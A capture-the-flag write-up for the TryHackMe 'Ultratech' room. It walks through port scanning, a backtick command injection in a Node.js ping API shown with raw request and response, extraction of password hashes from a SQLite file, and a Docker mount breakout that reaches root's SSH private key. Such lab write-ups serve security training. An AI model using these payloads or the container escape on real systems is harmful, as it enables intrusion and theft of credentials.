# Ultratech

[TryHackMe room link](https://tryhackme.com/room/ultratech1)

# Informations about the room

> You have been contracted by UltraTech to pentest their infrastructure. It is a grey-box kind of assessment, the only information you have is the company's name and their server's IP address.

# Open ports
21/tcp    open  ftp     syn-ack vsftpd 3.0.3

22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

8081/tcp  open  http    syn-ack Node.js Express framework

31331/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))

# Enumeration 

Gobuster finds a js file in `http://10.10.91.156:31331/js/api.js` that explains the usage of a API at port 8081

```javascript
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();
```

This API uses the native ping binary to ping XD a host supplied in the url

We can achieve a sort of command injection by adding a backtick before the command that you want to execute and at the end

This is the request made with burpsuite:
```console
GET /ping?ip=`id` HTTP/1.1
 Host: 10.10.91.156:8081
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Connection: close
 Upgrade-Insecure-Requests: 1
 If-None-Match: W/"105-8X9gjnZDRa4onQCfgq8xavlixLo"
```

This is the response:

```console
HTTP/1.1 200 OK
X-Powered-By: Express
Access-Control-Allow-Origin: *
Content-Type: text/html; charset=utf-8
Content-Length: 61
ETag: W/"3d-2J2mX1i3I4uQhsVi8ABaq24IgPw"
Date: Tue, 28 Mar 2023 13:18:15 GMT
Connection: close

ping: groups=1002(www): Temporary failure in name resolution
```

By running the `ls` command we can spot a utech.db.sqlite database

We can cat it and get the hashed passwords of two users

`r00t` and `admin`

# Privilege escalation

After logging in with ssh

We find ourselves in a docker container 

We can enumerate docker images by running `docker images`
```
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE                                                                                       
bash                latest              495d6437fc1e        4 years ago         15.8MB 
```

To break out of the container we will use the mounted volume from the host:

`docker run --rm -it -v /:/host bash bash`

[HackTricks explanation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#arbitrary-mounts)

```console
bash-5.0# id                                                                                                                                                               
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
bash-5.0# cd host
bash-5.0# ls
bin             etc             initrd.img.old  lost+found      opt             run             srv             tmp             vmlinuz
boot            home            lib             media           proc            sbin            swap.img        usr             vmlinuz.old
dev             initrd.img      lib64           mnt             root            snap            sys             var
bash-5.0# cd root
bash-5.0# cd .ssh/
bash-5.0# ls
authorized_keys  id_rsa           id_rsa.pub
bash-5.0# cat id_rsa
```
